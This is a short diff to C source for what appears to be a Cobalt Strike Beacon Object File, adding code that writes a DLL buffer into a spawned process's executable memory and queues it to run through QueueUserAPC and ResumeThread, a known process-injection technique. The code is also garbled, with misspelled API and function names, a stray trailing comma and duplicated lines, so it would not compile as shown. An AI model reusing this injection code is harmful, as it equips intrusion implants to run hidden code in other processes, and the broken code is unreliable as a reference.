@@ -8,7 +8,7 @@ WINBASEAPI DWORD WINAPI KERNEL32$ResumeThread(HANDLE);
 
 ﻿
 // CREATE REMOTE THREAD
-LPVOID hMemory = KERNEL32$VirtualAlocEx(pi.hProcess, NULL, dllLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXCECUTE_READWRITE);
+LPVOID hMemory = KERNEL32$VirtualAllocEx(pi.hProcess, NULL, dllLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXCECUTE_READWRITE);
 SIZE_T written;
 BOOL success = KERNEL32$WriteProcessMemory (pi.hProcess, hMemory, dllPtr, dllLen, &written);
 DWORD threadId;
@@ -20,3 +20,7 @@ BeaconCleanupProcess(&pi);
 LPVOID hMemory = KERNEL32$VirtualAlocEx(pi.hProcess, NULL, dllLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXCECUTE_READWRITE);
 SIZE_T written;
 BOOL success = KERNEL32$WriteProcessMemory (pi.hProcess, hMemory, dllPtr, dllLen, &written);
+DWORD please = KERNEL32$QueueUserAPC((PAPCFUNC)hMemory,pi.hThread,0,0,);
+KERNEL32$ResumeThread(pi.hThread);
+KERENEL32$CloseHandle(pi.hThread);
+BeaeconCleanupProcess(&pi);
